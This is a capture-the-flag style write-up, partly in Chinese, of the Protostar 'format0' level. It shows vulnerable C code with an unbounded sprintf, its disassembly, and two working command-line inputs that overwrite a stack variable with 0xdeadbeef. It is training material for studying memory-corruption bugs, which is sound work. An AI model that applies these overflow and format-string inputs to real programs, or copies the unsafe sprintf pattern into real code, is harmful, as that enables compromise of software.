# Format

## Format

### About

This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.

**Hints**

* This level should be done in less than 10 bytes of input.
* “Exploiting format string vulnerabilities”

This level is at /opt/protostar/bin/format0

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);

  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

`sprintf`指的是**字符串格式化命令**，主要功能是**把格式化的数据写入某个字符串中**。`sprintf` 是个[变参](https://baike.baidu.com/item/变参/9844833)函数。使用`sprintf` 对于写入`buffer`的字符数是**没有限制**的，这就存在了`buffer`溢出的可能性。

用objdump查看一下汇编代码，`target`变量在`ebp-0xc`处，`buffer`在`ebp-0x4c`处，二者相距`0x40`（64个字节），所以通过格式化字符串，**写入64个字符，后面跟上0xdeadbeef**，就能将`target`的值覆盖成`0xdeadbeef`。

```javascript
080483f4 <vuln>:
 80483f4:    55                       push   ebp
 80483f5:    89 e5                    mov    ebp,esp
 80483f7:    83 ec 68                 sub    esp,0x68
 80483fa:    c7 45 f4 00 00 00 00     mov    DWORD PTR [ebp-0xc],0x0
 8048401:    8b 45 08                 mov    eax,DWORD PTR [ebp+0x8]
 8048404:    89 44 24 04              mov    DWORD PTR [esp+0x4],eax
 8048408:    8d 45 b4                 lea    eax,[ebp-0x4c]
 804840b:    89 04 24                 mov    DWORD PTR [esp],eax
 804840e:    e8 ed fe ff ff           call   8048300 <sprintf@plt>
 8048413:    8b 45 f4                 mov    eax,DWORD PTR [ebp-0xc]
 8048416:    3d ef be ad de           cmp    eax,0xdeadbeef
 804841b:    75 0c                    jne    8048429 <vuln+0x35>
 804841d:    c7 04 24 10 85 04 08     mov    DWORD PTR [esp],0x8048510
 8048424:    e8 07 ff ff ff           call   8048330 <puts@plt>
 8048429:    c9                       leave
 804842a:    c3                       ret
```

你可以写入`64个A`或者其他的，或者可以通过`%64c`写入64个字符，后面在加上`deadbeef`。**$\(\)**是用来做**命令替换**的，先执行`$()`里面的命令，得到返回结果进行替换。

### Exp

```bash
user@protostar:/opt/protostar/bin$ ./format0 $(echo -en "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde")
you have hit the target correctly :)

user@protostar:/opt/protostar/bin$ ./format0 $(echo -en "%64c\xef\xbe\xad\xde")
you have hit the target correctly :)
```

